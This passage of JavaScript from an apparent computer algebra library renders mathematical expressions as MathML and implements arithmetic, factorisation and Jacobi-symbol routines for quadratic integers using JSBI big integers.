      return tmp[0];
    };

    var getDecimalZeroOffset = function () {
      var codePoint = Expression.numberFormat.format(0).trim().codePointAt(0);
      var isDecimalZero = replaceSimpleDigit(codePoint) === 0;

      if (!isDecimalZero) {
        console.error(codePoint);
        return 0;
      }

      return codePoint - "0".charCodeAt(0);
    };

    if (cachedFormatData.format !== Expression.numberFormat) {
      cachedFormatData = {
        format: Expression.numberFormat,
        decimalSeparator: getDecimalSeparator(),
        decimalZeroOffset: getDecimalZeroOffset()
      };
    } // This method is needed as native Intl.NumberFormat cannot format strings.
    // https://github.com/tc39/ecma402/issues/334


    var decimalSeparator = string.indexOf('.');

    if (decimalSeparator !== -1) {
      return numberFormat.format(string.slice(0, decimalSeparator)) + cachedFormatData.decimalSeparator + numberFormat.format(string.slice(decimalSeparator + '.'.length));
    }

    var decimalZeroOffset = cachedFormatData.decimalZeroOffset;

    if (decimalZeroOffset === 0) {
      return string;
    }

    var result = "";

    for (var i = 0; i < string.length; i += 1) {
      result += String.fromCodePoint(decimalZeroOffset + string.charCodeAt(i));
    }

    return result;
  }
};

Expression.Integer.prototype.toMathML = function (options) {
  //var d = Expression.toDecimalString(this, options);
  //if (d != undefined) {
  //  return d;
  //}
  var x = this;
  var sign = x.compareTo(Expression.ZERO) < 0 ? '-' : '';
  var abs = x.compareTo(Expression.ZERO) < 0 ? x.negate() : x;
  var s = abs.value.toString();
  var tmp = numberFormat.format(s);
  return sign === "-" ? "<mrow>" + "<mo>&minus;</mo>" + "<mn>" + tmp + "</mn>" + "</mrow>" : "<mn>" + tmp + "</mn>";
};

Expression.BinaryOperation.prototype.toMathML = function (options) {
  options = options == null ? {} : options;

  if (options != null && options.rounding != null && this.unwrap() instanceof Expression.Exponentiation && this.unwrap().a.unwrap() instanceof Expression.Symbol && this.unwrap().a.unwrap() !== Expression.E && this.unwrap().a.unwrap() !== Expression.PI && !(this.unwrap().a.unwrap() instanceof Expression.PolynomialRootSymbol) && !(this.unwrap().a.unwrap() instanceof Expression.ExpressionPolynomialRoot) && (this.unwrap().b.unwrap() instanceof Expression.Integer || this.unwrap().b.unwrap() instanceof Expression.Negation && this.unwrap().b.unwrap().b.unwrap() instanceof Expression.Integer)) {
    options = Object.assign({}, options, {
      rounding: null
    });
  }

  var d = Expression.toDecimalString(this, options);

  if (d != undefined) {
    return d;
  } //!2019-05-16


  if (this instanceof Expression.Addition && options.printId == undefined) {
    var summands = function (e) {
      //if (true) { return e.summands(); }
      var result = [];

      while (e.unwrap() instanceof Expression.Addition) {
        result.push(e.unwrap().b);
        e = e.unwrap().a;
      }

      result.push(e);
      return result;
    };

    var s = [];
    var b = null;

    for (var iteratorx = summands(this)[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
      if (b != null) {
        var n = false;

        if (b.isNegative()) {
          n = true;
          b = b.negateCarefully();
        }

        var fence = this.getPrecedence() >= getPrecedence(b, options);
        fence = fence || b.isUnaryPlusMinus();
        s.push((fence ? '<mrow><mo>(</mo>' : '') + b.toMathML(Expression.setTopLevel(fence, options)) + (fence ? '<mo>)</mo></mrow>' : ''));
        s.push(n ? '<mo>&minus;</mo>' : '<mo>+</mo>');
      }

      b = x;
    }

    s = s.reverse().join('');
    var a = b;
    var fence = a.getPrecedence() + (a.isRightToLeftAssociative() ? -1 : 0) < this.getPrecedence();

    if (options != undefined && options.isTopLevel != undefined && options.isTopLevel === false) {
      fence = fence || a.isUnaryPlusMinus();
    }

    s = (fence ? "<mrow><mo>(</mo>" : "") + a.toMathML(Expression.setTopLevel(fence || options == undefined || options.isTopLevel, options)) + (fence ? "<mo>)</mo></mrow>" : "") + s;
    return '<mrow>' + s + '</mrow>';
  } //!


  var a = this.a;
  var b = this.b;
  var isSubtraction = false; // TODO: check

  if (this instanceof Expression.Addition && b.isNegative()) {
    isSubtraction = true;
    b = b.negateCarefully(); //?
  }

  var fa = a.getPrecedence() + (a.isRightToLeftAssociative() ? -1 : 0) < this.getPrecedence();
  var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();

  if (options != undefined && options.isTopLevel != undefined && options.isTopLevel === false) {
    fa = fa || a.isUnaryPlusMinus();
  }

  fb = fb || b.isUnaryPlusMinus();
  fb = fb || this.unwrap() instanceof Expression.Exponentiation && b.unwrap() instanceof Expression.Exponentiation; // 2^3^4

  fa = fa || this.unwrap() instanceof Expression.Exponentiation && a.unwrap() instanceof Expression.Function; // cos(x)^(2+3)

  fa = fa || options.rounding != null && isConstant(a.unwrap()) && Expression.has(a.unwrap(), Expression.Complex); // sqrt(2)*(1+i)*x

  var s = isSubtraction ? "-" : this.getS();

  if (this instanceof Expression.Exponentiation) {
    if (a.unwrap() === Expression.E && b.unwrap() instanceof Expression.Matrix) {
      return '<mrow><mi>exp</mi><mo>&af;</mo>' + b.toMathML(options) + '</mrow>';
    }

    var boptions = options;

    if (!(a.unwrap() instanceof Expression.Matrix)) {
      boptions = Object.assign({}, options || {}, {
        nofractions: true
      });
    }

    return "<msup>" + (fa ? "<mrow><mo>(</mo>" : "") + a.toMathML(Expression.setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? "<mo>)</mo></mrow>" : "") + (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, boptions)) + (fb ? "<mo>)</mo></mrow>" : "") + "</msup>";
  }

  if (this.isNegation()) {
    // assert(fa === false);
    return "<mrow><mo>&minus;</mo>" + (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, options)) + (fb ? "<mo>)</mo></mrow>" : "") + "</mrow>";
  } //TODO: fix spaces (matrix parsing)
  // &times; looks better than &it; when multiplying matrices (?)
  // &sdot; looks better than &times;


  var isScalarOrMatrixSymbol = function (e) {
    return Expression.isScalar(e.unwrap()) || e.unwrap() instanceof Expression.MatrixSymbol;
  };

  var base = function (e) {
    return e instanceof Expression.Exponentiation && (e.b.unwrap() instanceof Expression.Integer || e.b.unwrap() instanceof Expression.Symbol && e.b.unwrap().symbol === "T") ? e.a.unwrap() : e;
  };

  var canUseInvisibleTimes = function (e) {
    return !fa && !fb && (e.a.unwrap() instanceof Expression.Integer || base(e.a.unwrap()) instanceof Expression.Symbol || e.a.unwrap() instanceof Expression.Multiplication && base(e.a.unwrap().b.unwrap()) instanceof Expression.Symbol) && (base(e.b.unwrap()) instanceof Expression.Symbol || options.rounding == null && e.b.unwrap() instanceof Expression.SquareRoot); //return options.rounding == null && !fa && !fb && isScalarOrMatrixSymbol(e.a) && isScalarOrMatrixSymbol(e.b) && !(e.a instanceof Expression.Integer && (e.b instanceof Expression.Integer || e.b instanceof Expression.Exponentiation && e.b.a instanceof Expression.Integer))
  }; //!2020-08-02


  if (this instanceof Expression.Multiplication && options.printId == undefined) {
    var f = true;

    for (var x = this; x != null; x = x instanceof Expression.Multiplication ? x.a.unwrap() : null) {
      var factor = x instanceof Expression.Multiplication ? x.b.unwrap() : x;

      if (!(base(factor).unwrap() instanceof Expression.Symbol && Expression.isScalar(factor))) {
        f = false;
      }

      if (factor instanceof Expression.ExpressionWithPolynomialRoot) {
        f = false; // like a+b*i
      }

      if (factor instanceof Expression.ExpressionPolynomialRoot) {
        f = false;
      }
    }

    if (f) {
      var s = [];

      for (var x = this; x != null; x = x instanceof Expression.Multiplication ? x.a.unwrap() : null) {
        var factor = x instanceof Expression.Multiplication ? x.b.unwrap() : x;
        s.push(factor.toMathML(Expression.setTopLevel(fence, options)));
      }

      s = s.reverse().join('<mo>&it;</mo>');
      return '<mrow>' + s + '</mrow>';
    }
  }

  return "<mrow>" + (fa ? "<mrow><mo>(</mo>" : "") + a.toMathML(Expression.setTopLevel(fa || options == undefined || options.isTopLevel, options)) + (fa ? "<mo>)</mo></mrow>" : "") + (s === '*' ? canUseInvisibleTimes(this) ? '<mo>&it;</mo>' : '<mo>&sdot;</mo>' : s === '-' ? '<mo>&minus;</mo>' : s === '/' ? '<mo>&#x2215;</mo>' : this instanceof Expression.Comma ? '<mo lspace="0em" rspace="0.55em">' + ',' + '</mo>' : '<mo>' + s + '</mo>') + (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, options)) + (fb ? "<mo>)</mo></mrow>" : "") + "</mrow>";
};

Expression.Symbol.prototype.toMathML = function (options) {
  var x = this;
  var s = x.symbol;
  var i = s.indexOf("_");

  if (i !== -1) {
    var indexes = s.slice(i + 1).replace(/^\(|\)$/g, "").split(",");
    var indexesMathML = "";

    for (var j = 0; j < indexes.length; j += 1) {
      indexesMathML += j !== 0 ? "<mo>,</mo>" : "";
      indexesMathML += /^\d+$/.exec(indexes[j]) != undefined ? Expression.Integer.fromString(indexes[j]).toMathML() : "<mi>" + indexes[j] + "</mi>";
    }

    if (indexes.length > 1) {
      indexesMathML = "<mrow>" + indexesMathML + "</mrow>";
    }

    var isVector = this instanceof Expression.MatrixSymbol && /^[a-z]$/.test(s.slice(0, i));
    return "<msub>" + "<mi" + (isVector ? " mathvariant=\"bold-italic\"" : "") + ">" + s.slice(0, i) + "</mi>" + indexesMathML + "</msub>";
  }

  var isVector = this instanceof Expression.MatrixSymbol && /^[a-z]$/.test(s);
  return "<mi" + (isVector ? " mathvariant=\"bold-italic\"" : "") + ">" + (this instanceof Expression.IdentityMatrix ? '<span class="dotted-underline" title="' + i18n.identityMatrix + '" aria-label="' + i18n.identityMatrix + '">' + s + '</span>' : s) + "</mi>";
};

Expression.Negation.prototype.toMathML = function (options) {
  var b = this.b;
  var fb = this.getPrecedence() + (this.isRightToLeftAssociative() ? -1 : 0) >= b.getPrecedence();
  fb = fb || b.isUnaryPlusMinus(); // assert(fa === false);

  return "<mrow><mo>&minus;</mo>" + (fb ? "<mrow><mo>(</mo>" : "") + b.toMathML(Expression.setTopLevel(fb, options)) + (fb ? "<mo>)</mo></mrow>" : "") + "</mrow>";
};

Expression.Factorial.prototype.toMathML = function (options) {
  var n = this.n.unwrap();
  var fn = !(n instanceof Expression.Integer && n.compareTo(Expression.ZERO) > 0);
  return "<mrow>" + (fn ? "<mrow><mo>(</mo>" : "") + n.toMathML(Expression.setTopLevel(fn, options)) + (fn ? "<mo>)</mo></mrow>" : "") + "<mo>!</mo></mrow>";
};

Condition.prototype.toMathML = function (options) {
  if (this === Condition.TRUE || this === Condition.FALSE) {
    // 1) no need; 2) no way to distinguish TRUE and FALSE
    throw new TypeError();
  }

  if (this.array.length === 0) {
    // assertion
    throw new TypeError();
  }

  var s = '';

  for (var i = 0; i < this.array.length; i += 1) {
    var c = this.array[i];
    s += i !== 0 ? '<mo lspace="0em" rspace="0.55em">,</mo>' : '';
    s += '<mrow>';
    var operator = '<mo>' + (c.operator === Condition.NEZ ? '&ne;' : c.operator === Condition.EQZ ? '=' : c.operator === Condition.GTZ ? '&gt;' : '???') + '</mo>';

    if (c.expression instanceof Expression.Addition && c.expression.a instanceof Expression.Symbol && c.expression.b instanceof Expression.Integer) {
      //TODO: ?
      var left = c.expression.a;
      var right = c.expression.b.negate();
      s += left.toMathML(options) + operator + right.toMathML(options);
    } else {
      s += c.expression.toMathML(options) + operator + Expression.ZERO.toMathML();
    }

    s += '</mrow>';
  }

  return this.array.length === 1 ? s : '<mrow>' + s + '</mrow>';
};

Expression.Complex.prototype.toMathML = function (options) {
  return this.toStringInternal(options, "<mo>&it;</mo>", "<mi>&ii;</mi>", "<mo>&minus;</mo>", "<mo>+</mo>", "<mrow>", "</mrow>", function (x, options) {
    return x.toMathML(options);
  });
};

Expression.GF2.prototype.toMathML = function (options) {
  //TODO: fix
  return this.a.toMathML(options);
};

Expression.GF2Value.prototype.toMathML = function (options) {
  return "<mrow>" + "<mn>" + this.value.toString() + "</mn>" + "</mrow>";
};

Expression.Degrees.prototype.toMathML = function (options) {
  return "<mrow>" + this.value.toMathML(options) + "<mo>&it;</mo><mi>&deg;</mi></mrow>";
};

Expression.Radians.prototype.toMathML = function (options) {
  return "<mrow>" + this.value.toMathML(options) + "<mo>&it;</mo><mi>rad</mi></mrow>";
};

NonSimplifiedExpression.prototype.toMathML = function (options) {
  //?
  //options = options.rounding != null ? Object.assign({}, options, {rounding: null}) : options;
  if (options != null && options.printId != undefined) {
    return "<mrow id=\"" + this.getId() + "\">" + this.e.toMathML(options) + "</mrow>";
  }

  return this.e.toMathML(options);
};

Expression.prototype.toMathML = function (options) {
  throw new TypeError();
};

Expression.DecimalFraction.prototype.toMathML = function (options) {
  return decimalToMathML(this.toString());
};
})();
var maybeJSBI = {
  toNumber: function toNumber(a) {
    return typeof a === "object" ? JSBI.toNumber(a) : Number(a);
  },
  add: function add(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.add(a, b) : a + b;
  },
  subtract: function subtract(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.subtract(a, b) : a - b;
  },
  multiply: function multiply(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.multiply(a, b) : a * b;
  },
  divide: function divide(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.divide(a, b) : a / b;
  },
  remainder: function remainder(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.remainder(a, b) : a % b;
  },
  exponentiate: function exponentiate(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.exponentiate(a, b) : typeof a === "bigint" && typeof b === "bigint" ? new Function("a", "b", "return a**b")(a, b) : Math.pow(a, b);
  },
  leftShift: function leftShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.leftShift(a, b) : a << b;
  },
  signedRightShift: function signedRightShift(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.signedRightShift(a, b) : a >> b;
  },
  bitwiseAnd: function bitwiseAnd(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseAnd(a, b) : a & b;
  },
  bitwiseOr: function bitwiseOr(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseOr(a, b) : a | b;
  },
  bitwiseXor: function bitwiseXor(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.bitwiseXor(a, b) : a ^ b;
  },
  lessThan: function lessThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThan(a, b) : a < b;
  },
  greaterThan: function greaterThan(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThan(a, b) : a > b;
  },
  lessThanOrEqual: function lessThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.lessThanOrEqual(a, b) : a <= b;
  },
  greaterThanOrEqual: function greaterThanOrEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.greaterThanOrEqual(a, b) : a >= b;
  },
  equal: function equal(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.equal(a, b) : a === b;
  },
  notEqual: function notEqual(a, b) {
    return typeof a === "object" && typeof b === "object" ? JSBI.notEqual(a, b) : a !== b;
  },
  unaryMinus: function unaryMinus(a) {
    return typeof a === "object" ? JSBI.unaryMinus(a) : -a;
  },
  bitwiseNot: function bitwiseNot(a) {
    return typeof a === "object" ? JSBI.bitwiseNot(a) : ~a;
  }
};


(function () {
  "use strict"; // https://en.wikipedia.org/wiki/Quadratic_integer
  // https://en.wikipedia.org/wiki/Factorization#Unique_factorization_domains
  // It is possible to use the comparision operators if a is a safe integer or BigIntegerInternal or BigInt and n is a safe integer:
  // a < n
  // a <= n
  // a > n
  // a >= n
  // a == n
  // a != n

  /*
  
        if (qi instanceof QuadraticInteger && qi.a < 0 || qi.b < 0) {
          var c = pow(qi.conjugate(), n, new QuadraticInteger(1, 0, qi.D));
          return qi.multiply(c).toExpression()._nthRoot(n).divide(new QuadraticInteger(Math.abs(qi.a), Math.abs(qi.b), qi.D).toExpression());
        }
  
  */

  function abs(a) {
    return JSBI.lessThan(a, JSBI.BigInt(0)) ? maybeJSBI.unaryMinus(a) : a;
  }

  function ngcd(a, b) {
    return JSBI.BigInt(bigIntGCD(JSBI.BigInt(a), JSBI.BigInt(b)));
  } // (a + b*sqrt(D))/(overTwo ? 2 : 1)
  // a, b, D - integers,
  // D - squarefree integer


  function QuadraticInteger(a, b, D, overTwo) {
    overTwo = overTwo == undefined ? false : overTwo;
    a = typeof a === "number" ? JSBI.BigInt(a) : a;
    b = typeof b === "number" ? JSBI.BigInt(b) : b;
    D = maybeJSBI.toNumber(D); //TODO:

    if (typeof a === "number" && Math.abs(a) > Number.MAX_SAFE_INTEGER) {
      throw new RangeError();
    }

    if (typeof b === "number" && Math.abs(b) > Number.MAX_SAFE_INTEGER) {
      throw new RangeError();
    }

    if (overTwo && D % 4 === 0) {
      throw new RangeError();
    }

    if (overTwo && JSBI.equal(JSBI.remainder(a, JSBI.BigInt(2)), JSBI.BigInt(0)) && JSBI.equal(JSBI.remainder(b, JSBI.BigInt(2)), JSBI.BigInt(0))) {
      overTwo = false;
      a = JSBI.divide(a, JSBI.BigInt(2));
      b = JSBI.divide(b, JSBI.BigInt(2));
    }

    if (overTwo && (JSBI.equal(JSBI.remainder(a, JSBI.BigInt(2)), JSBI.BigInt(0)) || JSBI.equal(JSBI.remainder(b, JSBI.BigInt(2)), JSBI.BigInt(0)))) {
      throw new RangeError();
    }

    this.a = a;
    this.b = b;
    this.D = D;
    this.overTwo = overTwo;
  }

  QuadraticInteger.prototype.multiply = function (y) {
    var x = this;

    if (!maybeJSBI.equal(x.D, y.D)) {
      throw new TypeError();
    }

    var a = JSBI.add(maybeJSBI.multiply(x.a, y.a), JSBI.multiply(maybeJSBI.multiply(x.b, y.b), JSBI.BigInt(y.D)));
    var b = maybeJSBI.add(maybeJSBI.multiply(x.a, y.b), maybeJSBI.multiply(x.b, y.a));
    var d = (x.overTwo ? 1 : 0) + (y.overTwo ? 1 : 0);

    while (d > 0 && JSBI.equal(JSBI.remainder(a, JSBI.BigInt(2)), JSBI.BigInt(0)) && JSBI.equal(JSBI.remainder(b, JSBI.BigInt(2)), JSBI.BigInt(0))) {
      a = JSBI.divide(a, JSBI.BigInt(2));
      b = JSBI.divide(b, JSBI.BigInt(2));
      d -= 1;
    }

    return new QuadraticInteger(a, b, x.D, d === 1);
  };

  QuadraticInteger.prototype.conjugate = function (y) {
    return new QuadraticInteger(this.a, maybeJSBI.unaryMinus(this.b), this.D, this.overTwo);
  };

  QuadraticInteger.prototype.norm = function () {
    //var x = this.a * this.a;
    //var y = this.b * this.b;
    //return x % this.D + (((x - x % this.D) / this.D) - y) * this.D;
    var a = this.a;
    var b = this.b;
    var D = this.D;
    var aa = maybeJSBI.multiply(a, a);
    var bb = maybeJSBI.multiply(b, b);
    var norm = JSBI.subtract(aa, JSBI.multiply(bb, JSBI.BigInt(D)));

    if (this.overTwo) {
      if (!JSBI.equal(JSBI.remainder(norm, JSBI.BigInt(4)), JSBI.BigInt(0))) {
        throw new RangeError("assertion");
      }

      norm = JSBI.divide(norm, JSBI.BigInt(4));
    }

    if (typeof norm === "number" && Math.abs(norm) > Number.MAX_SAFE_INTEGER) {
      throw new TypeError();
    }

    if (typeof a === "number" && maybeJSBI.greaterThanOrEqual(norm, maybeJSBI.unaryMinus(Number.MAX_SAFE_INTEGER)) && norm <= +Number.MAX_SAFE_INTEGER) {
      norm = maybeJSBI.toNumber(norm);
    }

    return norm;
  };

  QuadraticInteger.prototype.truncatingDivideInteger = function (x) {
    return new QuadraticInteger(x.toBigInt(), Expression.ZERO.toBigInt(), this.D).truncatingDivide(this);
  };

  QuadraticInteger.prototype.truncatingDivide = function (y) {
    if (!(y instanceof QuadraticInteger)) {
      if (!y instanceof Expression.Integer) {
        throw new RangeError();
      }

      y = new QuadraticInteger(y.toBigInt(), Expression.ZERO.toBigInt(), this.D);
    }

    var x = this;

    if (!maybeJSBI.equal(x.D, y.D)) {
      throw new TypeError();
    }

    var n = x.multiply(y.conjugate());
    var d = y.norm();

    while (JSBI.equal(JSBI.remainder(d, JSBI.BigInt(2)), JSBI.BigInt(0)) && JSBI.equal(JSBI.remainder(n.a, JSBI.BigInt(2)), JSBI.BigInt(0)) && JSBI.equal(JSBI.remainder(n.b, JSBI.BigInt(2)), JSBI.BigInt(0))) {
      n = new QuadraticInteger(JSBI.divide(n.a, JSBI.BigInt(2)), JSBI.divide(n.b, JSBI.BigInt(2)), n.D, n.overTwo);
      d = JSBI.divide(d, JSBI.BigInt(2));
    }

    if (!n.overTwo && n.D % 4 === 1 && JSBI.notEqual(JSBI.remainder(n.a, JSBI.BigInt(2)), JSBI.BigInt(0)) && JSBI.notEqual(JSBI.remainder(n.b, JSBI.BigInt(2)), JSBI.BigInt(0)) && JSBI.equal(JSBI.remainder(d, JSBI.BigInt(2)), JSBI.BigInt(0))) {
      n = new QuadraticInteger(n.a, n.b, n.D, true);
      d = JSBI.divide(d, JSBI.BigInt(2));
    }

    return JSBI.equal(maybeJSBI.remainder(n.a, d), JSBI.BigInt(0)) && JSBI.equal(maybeJSBI.remainder(n.b, d), JSBI.BigInt(0)) ? new QuadraticInteger(maybeJSBI.divide(n.a, d), maybeJSBI.divide(n.b, d), x.D, n.overTwo) : null;
  };

  QuadraticInteger.prototype.negate = function () {
    return new QuadraticInteger(maybeJSBI.unaryMinus(this.a), maybeJSBI.unaryMinus(this.b), this.D, this.overTwo);
  };
  /*
  function primeFactor(n) {
    var i = n - n;
    ++i;
    ++i;
    if (n % i == 0) {
      return i;
    }
    ++i;
    while (i * i <= n) {
      if (n % i == 0) {
        return i;
      }
      ++i;
      ++i;
    }
    return n;
  }
  */


  function factors(n) {
    if (JSBI.lessThan(n, JSBI.BigInt(1))) {
      throw new TypeError();
    }

    var p = JSBI.greaterThan(n, JSBI.BigInt(1)) ? JSBI.BigInt(primeFactor(n)) : JSBI.BigInt(1);
    var t = JSBI.BigInt(1);
    var f = JSBI.BigInt(1);
    var fs = null;
    var i = JSBI.BigInt(1);
    var result = {
      done: false,
      value: null,
      next: function () {
        if (JSBI.equal(p, JSBI.BigInt(1))) {
          this.value = null;
          this.done = true;
          return this;
        }

        if (fs == null) {
          if (JSBI.equal(JSBI.remainder(n, p), JSBI.BigInt(0))) {
            t = JSBI.multiply(t, p);
            n = JSBI.divide(n, p);
            this.value = t;
            this.done = false;
            return this;
          }

          fs = factors(n);
          i = t;
        }

        if (JSBI.equal(i, t)) {
          i = JSBI.BigInt(1);
          f = fs.next().value;
        } else {
          i = JSBI.multiply(i, p);
        }

        this.value = f == null ? null : JSBI.multiply(f, i);
        this.done = f == null;
        return this;
      }
    };

    result[Symbol.iterator] = function () {
      return this;
    };

    return result;
  }

  QuadraticInteger._factors = function (n) {
    return factors(JSBI.BigInt(n));
  };

  QuadraticInteger._complexIntegerPrimeFactor = function (r, i) {
    r = JSBI.BigInt(r);
    i = JSBI.BigInt(i);

    function canBePerfectSquare(n) {
      // https://www.johndcook.com/blog/2008/11/17/fast-way-to-test-whether-a-number-is-a-square/#comment-15700
      //var bitset = 0;
      //for (var i = 0; i < 32; i += 1) {
      //  bitset |= 1 << ((i * i) % 32);
      //}
      var bitset = 33751571;
      var result = (bitset >> JSBI.toNumber(JSBI.remainder(n, JSBI.BigInt(32)))) % 2;
      return result === 1;
    }

    function norm(a, b) {
      return maybeJSBI.add(maybeJSBI.multiply(a, a), maybeJSBI.multiply(b, b));
    }

    function hasDivisor(r, i, a, b) {
      var d = maybeJSBI.add(maybeJSBI.multiply(a, a), maybeJSBI.multiply(b, b));
      var x = maybeJSBI.add(maybeJSBI.multiply(r, a), maybeJSBI.multiply(i, b));
      var y = maybeJSBI.subtract(maybeJSBI.multiply(i, a), maybeJSBI.multiply(r, b));
      return JSBI.equal(maybeJSBI.remainder(x, d), JSBI.BigInt(0)) && JSBI.equal(maybeJSBI.remainder(y, d), JSBI.BigInt(0));
    }

    var n = norm(r, i); //if (n > (Number.MAX_SAFE_INTEGER + 1) / 2) {
    //TODO: should not throw (see a call from Polynomial#getroots)
    //throw new RangeError("NotSupportedError");
    //}

    for (var iteratorp = QuadraticInteger._factors(n)[globalThis.Symbol.iterator](), p = iteratorp.next().value; p != null; p = iteratorp.next().value) {
      var b = JSBI.BigInt(0);
      var c = p;

      while (JSBI.greaterThan(c, JSBI.BigInt(0))) {
        if (canBePerfectSquare(c)) {
          var a = JSBI.BigInt(nthRoot(JSBI.BigInt(c), 2));

          if (JSBI.equal(JSBI.multiply(a, a), c)) {
            if (JSBI.greaterThan(norm(a, b), JSBI.BigInt(1)) && hasDivisor(r, i, a, b)) {
              return JSBI.equal(b, JSBI.BigInt(0)) ? new Expression.Complex(Expression.ZERO, Expression.Integer.fromBigInt(a)) : new Expression.Complex(Expression.Integer.fromBigInt(a), Expression.Integer.fromBigInt(b));
            }
          }
        }

        b = JSBI.add(b, JSBI.BigInt(1));
        c = JSBI.subtract(p, JSBI.multiply(b, b));
      }
    }

    if (JSBI.greaterThan(n, JSBI.BigInt(1))) {
      throw new TypeError();
    }

    return new Expression.Complex(Expression.Integer.fromBigInt(r), Expression.Integer.fromBigInt(i));
  }; //  Compute (k n), where k is numerator


  function jacobiSymbol(k, n) {
    if (k < 0 || n % 2 == 0) {
      throw new Error("Invalid value. k = " + k + ", n = " + n);
    }

    k %= n;
    var jacobi = 1;

    while (k > 0) {
      while (k % 2 == 0) {
        k /= 2;
        var r = n % 8;

        if (r == 3 || r == 5) {
          jacobi = -jacobi;
        }
      }

      var temp = n;
      n = k;
      k = temp;

      if (k % 4 == 3 && n % 4 == 3) {
        jacobi = -jacobi;
      }

      k %= n;
    }

    if (n == 1) {
      return jacobi;
    }

    return 0;
  } // D**((p - 1) / 2) % p


  function LegendreSymbol(a, p) {
    // https://en.wikipedia.org/wiki/Legendre_symbol#:~:text=Special%20formulas
    // https://rosettacode.org/wiki/Jacobi_symbol#Java
    return jacobiSymbol(a, p);
  }

  function quadraticIntegers(norm, D, b) {
    var overTwo = maybeJSBI.toNumber(D) % 4 === 1;

    while (true) {
      var bbD = maybeJSBI.multiply(maybeJSBI.multiply(b, b), D);
      var guess1 = JSBI.add(JSBI.multiply(maybeJSBI.unaryMinus(norm), overTwo ? JSBI.BigInt(4) : JSBI.BigInt(1)), bbD);
      var guess2 = JSBI.add(JSBI.multiply(norm, overTwo ? JSBI.BigInt(4) : JSBI.BigInt(1)), bbD); //if (typeof norm === "number") {//TODO:

      if (JSBI.toNumber(guess2) > Number.MAX_SAFE_INTEGER || JSBI.toNumber(guess1) > Number.MAX_SAFE_INTEGER) {
        throw new RangeError(norm);
      } //}


      var guess = guess1;

      if (JSBI.greaterThanOrEqual(guess, JSBI.BigInt(0))) {
        var a = JSBI.BigInt(nthRoot(JSBI.BigInt(guess), 2));

        if (JSBI.equal(guess, JSBI.exponentiate(a, JSBI.BigInt(2)))) {
          // && ngcd(a, b) === 1
          return new QuadraticInteger(a, b, D, overTwo);
        }
      }

      var guess = guess2;

      if (JSBI.greaterThanOrEqual(guess, JSBI.BigInt(0))) {
        var a = JSBI.BigInt(nthRoot(JSBI.BigInt(guess), 2));

        if (JSBI.equal(guess, JSBI.exponentiate(a, JSBI.BigInt(2)))) {
          // && ngcd(a, b) === 1
          return new QuadraticInteger(a, b, D, overTwo);
        }
      }

      b = JSBI.add(b, JSBI.BigInt(1));
    }
  }

  QuadraticInteger._fundamentalUnit = function (D) {
    return quadraticIntegers(JSBI.BigInt(1), D, JSBI.BigInt(1));
  };

  QuadraticInteger.prototype.primeFactor = function () {
    var a = this.a;
    var b = this.b;
    var D = JSBI.BigInt(this.D);
    var g = ngcd(a, D); // from AlmostQuadraticInteger:
    //if (this.k.toBigInt() % this.qi.D == 0) {
    //TODO: ?
    //return this._toQuadraticInteger().primeFactor();
    //}

    var k = ngcd(a, b);

    if (JSBI.notEqual(k, JSBI.BigInt(1)) && JSBI.notEqual(k, JSBI.unaryMinus(JSBI.BigInt(1)))) {
      return JSBI.notEqual(k, D) ? Expression.Integer.fromBigInt(k).primeFactor() : new QuadraticInteger(JSBI.BigInt(0), JSBI.BigInt(1), D);
    } //


    if (JSBI.equal(g, D)) {
      //TODO: g != 1 - ?
      return new QuadraticInteger(JSBI.BigInt(0), JSBI.BigInt(1), D);
    } //var g = ngcd(a, b);


    var g = k; //!
    //while (g % 2 == 0) {
    //  g = g / 2;
    //}
    //!

    if (JSBI.notEqual(g, JSBI.BigInt(1))) {//TODO:
      //return new QuadraticInteger(primeFactor(g), 0, D);
      //return new QuadraticInteger(QuadraticInteger._factors(g).next().value, b - b, D);
    }

    var norm = this.norm(); //if (a == 0 || b == 0) {
    //return this;
    //}

    if (JSBI.equal(norm, JSBI.BigInt(1)) || JSBI.equal(norm, JSBI.unaryMinus(JSBI.BigInt(1)))) {
      // https://en.wikipedia.org/wiki/Quadratic_field#Orders_of_quadratic_number_fields_of_small_discriminant
      var unit = QuadraticInteger._fundamentalUnit(D);

      var uniti = unit.conjugate();
      var x = this;

      if (JSBI.lessThan(maybeJSBI.multiply(x.b, x.a), JSBI.BigInt(1))) {
        return JSBI.lessThan(x.a, JSBI.BigInt(0)) ? uniti.negate() : uniti;
      }

      return unit;
    }

    var v = this;

    for (var fs = QuadraticInteger._factors(abs(norm)), p = fs.next().value; p != null; p = fs.next().value) {
      //if (p * p <= norm || abs(norm) === p) {
      // ? https://www.johndcook.com/blog/2008/11/17/fast-way-to-test-whether-a-number-is-a-square/

      /*if (D === 17) {
        var t = Math.abs(norm);
        while (t % 2 === 0) {
          t /= 2;
        }
        p = t === 1 ? norm : primeFactor(t);
      }*/
      if (JSBI.equal(JSBI.remainder(D, JSBI.BigInt(4)), JSBI.BigInt(1)) && JSBI.equal(p, JSBI.BigInt(2))) {
        continue;
      }

